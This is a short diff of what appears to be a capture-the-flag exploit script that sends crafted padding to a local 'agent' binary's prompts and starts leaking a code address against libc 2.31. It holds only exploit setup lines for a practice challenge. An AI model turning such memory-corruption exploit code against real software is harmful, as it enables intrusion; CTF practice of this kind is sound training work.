@@ -6,10 +6,11 @@ libc = ELF('../dist/libc-2.31.so')
 #io = Socket("localhost", 30005)
 io = Process("../dist/agent")
 
-io.sendlineafter("Name > ", "A"*0x1)
-io.sendlineafter("Words > ", "B"*0x1)
+#input()
+io.sendlineafter("Name > ", "N"*0xf)
+io.sendlineafter("Words > ", "W"*0xff)
 io.sendlineafter("Age > ", "256")
-io.sendlineafter("Job > ", "C" * (0x10 - 3) + "END")\
+io.sendlineafter("Job > ", "J" * (0x10 - 3) + "END")
 
 # leak text addr
 io.recvuntil("END")
